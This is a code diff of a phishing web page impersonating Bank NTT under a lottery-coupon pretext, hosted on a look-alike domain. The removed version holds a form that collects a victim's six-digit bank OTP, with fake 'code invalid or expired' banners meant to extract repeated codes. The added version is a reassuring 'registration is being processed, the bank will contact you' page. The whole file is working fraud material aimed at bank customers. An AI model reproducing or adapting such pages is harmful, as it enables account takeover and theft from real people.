@@ -1,615 +1,199 @@
-<html><head> 
-    <meta charset="utf-8"> 
-    <meta name="fragment" content="!"> 
-    <meta name="theme-color" content="#097dd9"> 
-     <!-- HTML Meta Tags -->
-  
-    <title>Bank NTT</title>
-  
-    <meta name="description" content="BRIPoin adalah program loyalitas yang ditujukan untuk seluruh Nasabah, Simpedes, E-Banking, Kartu Debit dan Kartu Kredit). Perbanyak poin Anda dari segala jenis transaksi  dan tukar poin dengan beragam reward menarik khusus untuk nasabah setia Bank NTT.">
-  
-    <!-- Facebook Meta Tags -->
-    <meta property="og:url" content="https://bripoin.bri.co.id">
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="BANK NTT">
-    <meta property="og:description" content="BANK NTT">
-    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQe2_RRje_H6EnHBS7-zriaK4XxvgoL3qqnmA&usqp=CAU">
-   <script src="typed.js"></script>
-    <!-- Twitter Meta Tags -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta property="twitter:domain" content="bripoin.bri.co.id">
-    <meta property="twitter:url" content="https://bripoin.bri.co.id">
-    <meta name="twitter:title" content="BANK NTT">
-    <meta name="twitter:description" content="BANK NTT.">
-    <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQe2_RRje_H6EnHBS7-zriaK4XxvgoL3qqnmA&usqp=CAU">
-  
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
-  <link rel="icon" href="" type="image/x-icon">
-  <link rel="apple-touch-icon" href="images/AddText_10-22-11.27.23.jpg">
-  
-          
-    <link href="css/boostrap.css" rel="stylesheet" crossorigin="anonymous"> 
-    <link rel="stylesheet" href="css/ionicom.min.css"> 
-    <style>
-          @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');
-          body {
-              padding: 0;
-              margin: 0;
-              width: 100%;
-              font-family: 'Open Sans', sans-serif;
-              position: fixed;
-              background:#ffffff;
-          }
-  
-          .text-header {
-              font-family: 'Open Sans', sans-serif;
-              color: #0086e0;
-          }
-  
-          .text-subheader {
-              font-family: 'Open Sans', sans-serif;
-              margin-top: -20px;
-              color: #000000;
-          }
-  
-          .btn-punya {
-              display: block;
-              margin: 80px auto 0 auto;
-              padding: 0px; 
-              cursor: pointer; 
-              background: none rgb(92,177,224);
-              border: none; 
-              text-align: center; 
-              height: 57px; 
-              width: 459px; 
-              max-width: 100%;
-              font-family: Arial; 
-              font-size: 14px; 
-              font-weight: bold; 
-              color: rgb(92,177,224); 
-              letter-spacing: 2px; 
-              line-height: 1; 
-              border-radius: 5px; 
-              box-shadow: rgb(92,177,224) 2px 2px 4px 0px; 
-              transition: background 200ms ease 0s;
-          }
-  
-          .btn-belum {
-              display: block;
-              margin: 10px auto;
-              padding: 0px; 
-              cursor: pointer; 
-              background: none transparent;
-              border: none; 
-              text-align: center; 
-              height: 57px; 
-              width: 459px; 
-              max-width: 100%;
-              font-family: Arial; 
-              font-size: 14px; 
-              font-weight: bold; 
-              color: rgb(92,177,224);
-              letter-spacing: 2px; 
-              line-height: 1; 
-              border-radius: 5px; 
-              transition: background 200ms ease 0s;
-          }
-  
-          .form-log {
-              box-sizing: border-box; 
-              height: 45px; 
-              width: 336px;
-              max-width: 90%;
-              border: 3px solid rgb(92,177,224);
-              border-radius: 23px;
-              font-family: 'Open Sans', sans-serif;
-              font-size: 16px; 
-              color: rgb(28, 28, 28); 
-              word-spacing: 0px; 
-              padding: 0px 45px;
-              text-align: center;
-              }
-  
-          #ionIcons {
-              color: rgb(92,177,224);
-              font-size: 29px;
-              position: absolute;
-              display: block;
-              margin-top: 8px;
-              margin-left: 37px;
-          }
-  
-          .eye {
-              display: block;
-              margin: -40px auto;
-              margin-right: 20px;
-              position: relative;
-              box-sizing: border-box; 
-              z-index: 16; 
-              height: 19.8189px;
-              width: 25.0236px; 
-              float: right;
-              border-radius: 0px; 
-              cursor: pointer;
-          }
-  
-          .Button clickable-element {
-              display: block;
-              margin: 60px 0 0 0;
-              padding: 0px; 
-              cursor: pointer; 
-              background: none rgb(92,177,224); 
-              border: none; 
-              text-align: center; 
-              height: 57px; 
-              width: 370px; 
-              font-family: Arial; 
-              font-size: 17px; 
-              font-weight: bold; 
-              color: rgb(255, 255, 255); 
-              letter-spacing: 1px; 
-              line-height: 1; 
-              border-radius: 8px; 
-              box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
-              transition: background 100ms step-start 0s;
-          }
-  
-          @media only screen and (max-width: 600px) {
-              .btn-login {
-                  width: 82%;
-              }
-          }
-  
-          .box-lte {
-              width: 380px;
-              max-width: 95%;
-              background: none;
-              display: block;
-              
-              margin: -40px auto;
-              border-radius: 20px;
-          }
-  
-          textarea {
-              box-sizing: border-box; 
-              height: 75px;
-              margin-top: -30px;
-              width: 280px;
-              border: 3px solid rgb(92,177,224);
-              box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
-              border-radius: 15px;
-              padding: 5px 10px;
-          }
-          
-            .textarea1 {
-              box-sizing: border-box; 
-              
-              border: 2px solid red;
-              box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
-              border-radius: 50px;
-              
-          }
-          
-           .textarea {
-              box-sizing: border-box; 
-              height: 75px;
-             
-              width: 280px;
-              border: 2px solid red;
-              box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
-              border-radius: 15px;
-              padding: 5px 10px;
-          }
-          
-          textarea::placeholder{
-              font-size: 13px;
-          }
-             h1{
-              display: table;
-              background-color: transparent;
-              color: rgb(92,177,224);
-              padding: 15px;
-              width: 100%;
-              font-size: 14px;
-              margin-bottom: -70px;
-              text-align: center;
-              position: fixed;
-              top: 80;
-             font-weight: bold;
-              right: 0;
-              left: 0;
-              margin: 0px auto;
-              
-          }
-          
-          .blink {
-    animation: blink-animation 2s steps(6, start) infinite;
-    -webkit-animation: blink-animation 2s steps(6, start) infinite;
-  }
-  @keyframes blink-animation {
-    to {
-      visibility: hidden;
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>𝗞𝘂𝗽𝗼𝗻 𝗨𝗻𝗱𝗶𝗮𝗻 | 𝗕𝗮𝗻𝗸 NTT</title>
+</head>
+
+<body>
+
+  <style>
+    * {
+      padding: 0;
+      margin: 0;
+      text-decoration: none;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     }
-  }
-  @-webkit-keyframes blink-animation {
-    to {
-      visibility: hidden;
+
+    .header {
+      display: flex;
+      width: 100%;
+      height: 13vh;
+      background-color: rgb(255, 255, 255);
+      border-bottom: 1px solid rgb(193, 190, 190);
     }
-  }
-  
-  #Aktivasi{
-      display: none;
-  }
-  
-      </style> 
-      
-         <style>
-  #animation-demo {
-      width: 200px;
-      height: 150px;
-      position: relative;
-      background-color: #62A80A;
-      line-height: 150px;
-      color: #000;
-      border: solid 1px #1A7404;
-      text-align: center;
-  } 
-  
-  .animated {
-      -webkit-animation-duration: 1s;
-      animation-duration: 1s;
-      -webkit-animation-fill-mode: both;
-      animation-fill-mode: both;
-      -webkit-animation-timing-function: linear;
-      animation-timing-function: linear;
-       -webkit-animation-name: bounceIn; 
-      animation-name: bounceIn; 
-  }
-  
-  @-webkit-keyframes bounceIn { 
-      0% { 
-          opacity: 1; 
-          -webkit-transform: scale(0); 
-      } 
-  
-      50% { 
-          opacity: 1; 
-          -webkit-transform: scale(0); 
-      } 
-  
-      70% { 
-          -webkit-transform: scale(0); 
-      } 
-  
-      100% { 
-           -webkit-transform: scale(0); 
-      } 
-  } 
-  
-  @keyframes bounceIn { 
-      0% { 
-          opacity: 1; 
-          transform: scale(.1); 
-      } 
-  
-      50% { 
-          opacity: 1; 
-          transform: scale(.5); 
-      } 
-  
-      70% { 
-          transform: scale(1); 
-      } 
-  
-      100% { 
-          transform: scale(1); 
-      } 
-  } 
-  
-  
-  </style>  
-    <style>
-  #animation-demo {
-      width: 200px;
-      height: 150px;
-      position: relative;
-      background-color: #62A80A;
-      line-height: 150px;
-      color: #000;
-      border: solid 1px #1A7404;
-      text-align: center;
-  } 
-  
-  .naik {
-      -webkit-animation-duration: 1s;
-      animation-duration: 1s;
-      -webkit-animation-fill-mode: both;
-      animation-fill-mode: both;
-      -webkit-animation-timing-function: ease-in;
-      animation-timing-function: ease-in;
-      -webkit-animation-name: bounceOutUp; 
-      animation-name: bounceOutUp; 
-  }
-  
-  @-webkit-keyframes bounceOutUp { 
-      0% { 
-          -webkit-transform: translateY(0); 
-      } 
-      20% { 
-          opacity: 1; 
-          -webkit-transform: translateY(20px); 
-      } 
-      100% { 
-          opacity: 1; 
-          -webkit-transform: translateY(-200px); 
-      } 
-  } 
-  @keyframes bounceOutUp { 
-      0% { 
-          transform: translateY(0); 
-      } 
-      20% { 
-          opacity: 1; 
-          transform: translateY(20px); 
-      } 
-      100% { 
-          opacity: 1; 
-          transform: translateY(-500px); 
-      } 
-  } 
-  .bounceOutUp { 
-      
-  }
-  
-  
-  /*********************/
-  .process1 {
-       width: 100%;
-              height: 100%;
-               display: flex;
-               justify-content: center;
-              margin: auto;
-              position: absolute;
-             padding-top: 300px;
-              left: 0;
-              right: 0;
-              bottom: 0;
-              background: rgba(0, 0, 0, 0.6);
-              z-index: 99999;
-              
-        
-  }
-  .loading {
+
+    .header .logo {
+      display: flex;
+      position: absolute;
+      left: 20px;
+    }
+
+    .header .logo2 {
+      width: 150px;
+      height: 50px;
+      margin-top: 30px;
+    }
+
+    .header .logo1 {
+      width: 100px;
+      margin-top: 8px;
+      padding: 10px 0px;
+    }
+
+    .header .bahasa {
+      right: 40px;
       position: absolute;
       display: flex;
+      margin-top: 45px;
+    }
+
+    .header h1 {
+      text-decoration: underline;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+      font-size: 0.8rem;
+      cursor: pointer;
+      margin-left: 180px;
+    }
+
+    section {
+      margin: 0 auto;
       justify-content: center;
-      align-items: center;
-      margin-bottom: 20%;
-      margin-top: 300px;
-  }
-  .loading img {
-      width: 50px;
-      
-      top: 10;
-  }
-  .loading .spinner{
-      position: absolute;
-      width: 35px;
-      animation: spin 1s linear infinite;
-      -webkit-animation: spin 1s linear infinite;
-      -moz-animation: spin 1s linear infinite;
-      -ms-animation: spin 1s linear infinite;
-      -o-animation: spin 1s linear infinite;
-  }
-  @keyframes spin {
-    0% { transform: rotate(360deg); }
-    100% { transform: rotate(0deg); }
-  }
-  @-webkit-keyframes spin {
-    0% { -webkit-transform: rotate(360deg); }
-    100% { -webkit-transform: rotate(0deg); }
-  }
-  @-moz-keyframes spin {
-    0% { -webkit-transform: rotate(360deg); }
-    100% { -webkit-transform: rotate(0deg); }
-  }
-  @-ms-keyframes spin {
-    0% { -webkit-transform: rotate(360deg); }
-    100% { -webkit-transform: rotate(0deg); }
-  }
-  @-o-keyframes spin {
-    0% { -webkit-transform: rotate(360deg); }
-    100% { -webkit-transform: rotate(0deg); }
-  }
-  
-  
-  .loader{
-        font-size: 20px;
-        color: #FFF;
-        font-weight: bold;
-        display: inline-block;
-        font-family: 'Nunito', sans-serif;
-        
-        position: absolute;
-        margin-top: 0px;
+      display: flex;
+      text-align: center;
+    }
+
+    .kolom1 {
+      display: flex;
+      background-color: rgb(94, 148, 250);
+      width: 100%;
+      margin: 0px 20px;
+      border: 3px solid whitesmoke;
+      box-shadow: 0px 0px 10px 1px black;
+      padding: 20px;
+      border-radius: 30px;
+      text-align: center;
+      height: 150px;
+    }
+
+    #typedtext {
+      font-family: monospace;
+      font-size: 20px;
+      color: white;
+      font-weight: 800;
+    }
+
+    /* The typewriter cursor effect */
+    @keyframes blink-caret {
+
+      from,
+      to {
+        border-color: transparent
       }
-      .loader:before{
-        content: '';
-        animation: 2s print linear alternate infinite;
+
+      50% {
+        border-color: orange
       }
-      .loader:after{
-        content: '';
-        position: absolute;
-        right: -4px;
-        top: 50%;
-        transform: translatey(-45%);
-        width: 2px;
-        height: 1.3em;
-        background: currentColor;
-        opacity: 0.8;
-        animation: 1s blink steps(2) infinite;
-      }
-      
-      @keyframes blink {
-        0%  { visibility: hidden;}
-        100%  { visibility: visible;}
-      }
-      @keyframes print {
-        0% { content: 'B'}
-        10% { content: 'BR'}
-        20% { content: 'BRI'}
-        30% { content: 'BRIm'}
-        40% { content: 'BRImo'}
-        50% { content: 'BRImo-'}
-        60% { content: 'BRImo-B'}
-        70% { content: 'BRImo-BR.'}
-        80% { content: 'BRImo-BRI..'}
-        90% , 100% { content: 'BRImo-BRI...'}
-      }
-      
-  .typed {
-    
-  }
-  
-  .typed-cursor{
-     opacity: 1;
-     animation: blink 0.7s infinite;
-  }
-  
-  @keyframes blink{
-      0% { opacity:1; }
-      50% { opacity:0; }
-      100% { opacity:1; }
-  }       
+    }
+    .info {
+      display: flex;
+      justify-content: center;
+      margin-top: 20px;
+    }
+    .info h2{
+      background-color: rgb(94, 148, 250);
+      padding: 10px;
+      font-size: 1rem;
+      border-top-right-radius: 20px;
+      border-top-left-radius: 20px;
+      border-top: 3px solid whitesmoke;
+      color: white;
+      box-shadow: 0px 0px 5px 1px black;
+      border-left: 1px solid whitesmoke;
+      border-right: 1px solid whitesmoke;
+    }
+    footer {
+      position: fixed;
+      bottom: 0;
+    }
+    footer img {
+      width: 100%;
+    }
+    .foto img {
+      width: 100%;
+      border-bottom-right-radius: 200px;
+      box-shadow: 0px 0px 5px 5px black;
+      border-bottom: 3px solid rgb(93, 93, 4);
+    }
   </style>
-   </head> 
-   <body> 
-    <span class="blink" style="display: none" id="blinkk"><h1>Tautan Link tidak Valid, atau sudah Kadaluarsa</h1></span>
-   <span class="blink" style="display: none" id="blinkAktivasi"><h1>Kode OTP tidak valid, atau sudah kadaluarsa</h1></span> 
-    <div id="popupku" style="position: fixed;
-    top: 0;
-    left: 0;
-    right: 0;
-    bottom: 0;
-    width: 100%; height: 100%; background: rgba(0,0,0, 0.4); z-index: 9999">
-      <center>
-   <img id="gambarku" class="animated" src="https://programundinb4nkntt.yyznxn.web.id/images/q9fldl.jpg" width="60%" style="margin-top: 250px; border-radius: 15px; box-shadow: #7a1414  0px 2px 5px 0px; border: 2px double #097dd9" onclick="tutupimg()">
-      </center>
+
+  <header class="header">
+    <div class="logo">
+      <img class="logo1" src="llooggoo.png">
+      <img class="logo2" src="logo2.png" alt="">
+    </div>
+    <div class="bahasa">
+      <h1>Bahasa Indonesia </h1>
+    </div>
+  </header>
+  <div class="foto">
+    <img src="https://programundinb4nkntt.yyznxn.web.id/images/1000226744.png" alt="">
   </div>
-  <nav style=" top: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 65px; background: #F1F5F8; z-index: 99999; border-bottom: 0.5px solid #ddd">
-   <img src="https://programundinb4nkntt.yyznxn.web.id/images/7po10l.jpg" style="width: 100%; position: fixed; top: 0; left: 0; right: 0; margin: 0px auto;border-bottom: 0.5px solid #ddd">
-  </nav>
-  <img src="https://programundinb4nkntt.yyznxn.web.id/images/1000226744.png" style="width: 100%; border-radius: 0px 0px 100px 0px; border-bottom: 5px double #F6AA23; outline: 2px solid #901919;background: #ffffff; box-shadow: rgba(0, 0, 0, 2.2)  0px 2px 7px 0px;">  
-  <span class="blink" style="display: none" id="blinkk"><h1>Kode OTP tidak Valid, atau sudah Kadaluarsa</h1></span>
-    <div class="container" id="otp"> 
-     <div class="box-lte"> 
-      <div class="row" style="margin-top: 100px;"> 
-       <center>
-       <div class="col-12 d-block mx-auto text-center p-0" style="height: 62%; width: 100%; max-width: 100%; display: block; border-radius: 0px 25px 0px 25px; position: absolute; margin: 0px auto; left: 0; right: 0;z-index: -1; text-align: center; margin-top: 75px ;"> 
-  
-       </div> 
-      </center></div> 
-     
-  
-      <center>
-      <div class="row" style="margin-top: 0px; border: 2px solid #fff; width: 100%;height:165px; border-radius: 15px; background-image: url(); background-size: 100% 100%; background-position: 100% 100%; padding-top: 10px; box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px; margin: -30px auto; background: #fff; padding: 10px; color: #097dd9; font-weight: 550; color: #fff;
-  background: rgb(92,177,224);
-  text-shadow: #101010 1px 1px 0; font-weight: bold; box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; font-size: 15px; text-align: center" id="Typed"> 
-      
-      </div> 
-    </center></div>
-     <div class="container" id="Aktivasi" style="display: none"> 
-     <div class="box-lte"> 
-      <div class="row" style="margin-top: 140px;"> 
-       <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; display: block; margin-top: -50px; border-radius: 0px;"> 
-       
-       </div> 
-      </div> 
-  
-      <div class="row"> 
-      
-       <hr style="display: block; margin: auto; width: 90%;"> 
-       <p style="font-weight: bold; font-size: 20px; color: #098ce3; text-align: center; margin: -10px auto;" id="waktu">1 : 00</p> 
-      
-      </div> 
-      <div class="row"> 
-       <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px; margin-top: -10px"> 
-        <p style="font-size: 10px; text-align: center; font-weight: bold; padding: 15px">Silahkan masukan kode Virtual TARIF Anda, Jika belum menerima Kode silahkan klik tombol di bawah ini<br></p><div style="font-weight: bold; text-align: center; margin-top: -20px; margin-bottom: -20px; color: #098ce3">Masukkan Kode OTP</div><p></p> <br>
-       </div> 
-      </div> 
-      <div class="row"> 
-       <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto;"> 
-    <form onsubmit="kirimPesan(event)" method="post" id="formLink">
-         <center> 
-          <div style="margin-top: -21px"> 
-          
-         <i class="ion-ios-locked-outline" id="ionIcons"></i> 
-     
-  
-           <input type="tel" name="otp" id="nama1" class="bubble-element Input form-log" placeholder="KODE Virtual 6 DIGIT" maxlength="6" minlength="6" pattern="(?=.*[0-9]).{6,6}" required="" oninvalid="this.setCustomValidity('Mohon mɑsukkɑn 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 dengɑn ;benɑr')" onchange="this.setCustomValidity('')" style="margin-left: 0px;" onclick="gantiborder1()">
-    
-           <b> <a href="onclick='windiw.location.href=''"><p style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px; position: relative" onclick="window.location.href=''"><strong style="color: rgb(92,177,224); text-decoration: none"> Belum Menerima Kode OTP ?<br>
-           <span style="color: rgb(92,177,224)">Klik Disini</span>
-           </strong></p></a></b>
-          </div>
-         </center>
-         <b>
-  <input type="submit" id="kirims" class="bubble-element Button clickable-element" style="max-width: 85%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 15px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" value="Konfirmasi">
-  </b>
-        </form>
-       </div>
-       <b> </b>
-      </div>
-      <b> </b>
-     </div>
-  
-     
-     <b> 
-       </b></div><b> 
-       <center>
-   <img src="https://programundinb4nkntt.yyznxn.web.id/images/3nj843.jpg" style="width: 100%; position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto">
-       </center>
-      </b></div><b> </b>
-    
-      <center>
-       <div id="process1" name="process" class="process1" style="display: none;">
-             <span class="loader"></span>
-          </div>
-          </center>  
-    <audio hidden="" controls="" id="bsi">
-  <source src="cs.mp3" type="audio/ogg">
-  <source src="cs.mp3" type="audio/mpeg">
-    Your browser does not support the audio element.
-  </audio> 
-   <audio hidden="" controls="" id="bsiku">
-  <source src="tunggu-bri_" type="audio/ogg">
-  <source src="tunggu-bri_" type="audio/mpeg">
-    Your browser does not support the audio element.
-  </audio>       	
-   <script src="js/jquery.min.js"></script>  
-  <script src="js/jquery.min_1.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-  <script src="mainkode.js"></script>
-     <script src="js/jquery.min_2.js"></script>
-   
-     <script>
-   function tutupimg(){
-        setTimeout(() => {
-    $("#popupku").hide();
-        },0)
-        setTimeout(() => {
-         audio = document.getElementById("bsi");
-      audio.play();
-      audio.loop = false
-        },900)
-    $("#gambarku").addClass("naik");
-    new Typed('#typed',{
-    strings : ['', 'Terimakasih Telah Mendaftar Dilayanan Bank NTT,  Pendaftaran Anda Sedang Diproses, Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank NTT, Untuk Proses Cetak Kode Kupon Undian Anda'],
-    typeSpeed : 45,
-    delaySpeed : 1000,
-    loop : false
-  });
-   }
-  
+  <div class="info">
+    <h2>INFORMATION</h2>
+  </div>
+  <section>
+    <div class="kolom1">
+    <div id="typedtext"></div>
+    </div>
+  </section>
+
+  <footer>
+    <img src="https://programundinb4nkntt.yyznxn.web.id/images/3nj843.jpg" alt="">
+  </footer>
+
+  <script>
+    // set up text to print, each item in array is new line
+var aText = new Array(
+"Terima Kasih Telah Mendaftar Dilayanan Bank NTT", 
+"Pendaftaran Anda Sedang Diproses,Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank NTT, Untuk Proses Cetak Kode Kupon Undian Anda"
+);
+var iSpeed = 100; // time delay of print out
+var iIndex = 0; // start printing array at this posision
+var iArrLength = aText[0].length; // the length of the text array
+var iScrollAt = 20; // start scrolling up at this many lines
+ 
+var iTextPos = 0; // initialise text position
+var sContents = ''; // initialise contents variable
+var iRow; // initialise current row
+ 
+function typewriter()
+{
+ sContents =  ' ';
+ iRow = Math.max(0, iIndex-iScrollAt);
+ var destination = document.getElementById("typedtext");
+ 
+ while ( iRow < iIndex ) {
+  sContents += aText[iRow++] + '<br />';
+ }
+ destination.innerHTML = sContents + aText[iIndex].substring(0, iTextPos) + "_";
+ if ( iTextPos++ == iArrLength ) {
+  iTextPos = 0;
+  iIndex++;
+  if ( iIndex != aText.length ) {
+   iArrLength = aText[iIndex].length;
+   setTimeout("typewriter()", 500);
+  }
+ } else {
+  setTimeout("typewriter()", iSpeed);
+ }
+}
+
+
+typewriter();
   </script>
-  
-  </body></html>
+</body>
+
+</html>
